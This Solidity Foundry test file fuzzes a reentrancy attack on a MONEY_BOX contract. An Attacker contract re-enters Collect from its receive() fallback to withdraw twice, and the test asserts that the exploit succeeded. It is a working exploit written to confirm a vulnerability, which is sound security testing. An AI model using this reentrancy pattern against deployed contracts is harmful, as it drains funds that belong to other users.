
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX, Log} from "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {

    MONEY_BOX public _contractUnderTest;
    Log public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        _contractUnderTest = new MONEY_BOX();
        _contractUnderTest.SetMinSum(1);
        _contractUnderTest.SetLogFile(address(logFile));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= type(uint128).max / 2);
        

        // --- 2. State Configuration (Pre-Condition) ---

        // --- 3. Funding ---
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        vm.deal(address(_attacker), attackVal * 2);

        vm.deal(address(this), attackVal * 2);
        
        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        vm.warp(block.timestamp + 1);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public reentryAmount;

    constructor(address victimAddress) { 
        victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        victim.Put{value: 2 * val}(0);
    }

    function attack(uint256 val) public {
        reentryAmount = val;
        victim.Collect(val);

        if (attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.Collect(reentryAmount);
        }
    }
}
